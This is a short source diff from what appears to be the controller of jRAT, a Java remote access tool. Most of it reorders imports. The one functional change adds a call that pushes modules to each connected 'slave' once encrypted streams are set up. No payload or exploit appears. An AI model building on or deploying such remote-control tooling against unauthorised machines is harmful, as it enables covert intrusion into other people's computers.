@@ -13,6 +13,7 @@ import io.jrat.controller.exceptions.CloseException;
 import io.jrat.controller.io.CountingInputStream;
 import io.jrat.controller.io.CountingOutputStream;
 import io.jrat.controller.ip2c.Country;
+import io.jrat.controller.modules.ModuleLoader;
 import io.jrat.controller.net.ConnectionHandler;
 import io.jrat.controller.net.ServerListener;
 import io.jrat.controller.settings.Settings;
@@ -20,7 +21,13 @@ import io.jrat.controller.settings.SettingsCustomID;
 import io.jrat.controller.settings.StatisticsCountry;
 import io.jrat.controller.utils.FlagUtils;
 import io.jrat.controller.utils.TrayIconUtils;
-import java.awt.TrayIcon;
+import oslib.AbstractOperatingSystem;
+import oslib.OperatingSystem;
+
+import javax.crypto.*;
+import javax.crypto.spec.IvParameterSpec;
+import javax.swing.*;
+import java.awt.*;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.net.Socket;
@@ -28,15 +35,6 @@ import java.security.PublicKey;
 import java.util.Random;
 import java.util.Timer;
 import java.util.TimerTask;
-import javax.crypto.Cipher;
-import javax.crypto.CipherInputStream;
-import javax.crypto.CipherOutputStream;
-import javax.crypto.KeyGenerator;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
-import javax.swing.ImageIcon;
-import oslib.AbstractOperatingSystem;
-import oslib.OperatingSystem;
 
 public abstract class AbstractSlave implements Runnable {
 	
@@ -308,6 +306,8 @@ public abstract class AbstractSlave implements Runnable {
 		
 		this.dis = new DataInputStream(new CipherInputStream(new CountingInputStream(inputStream), inCipher));
 		this.dos = new DataOutputStream(new CipherOutputStream(new CountingOutputStream(outputStream), outCipher));
+
+        ModuleLoader.send(this);
 	}
 	
 	public void update() {
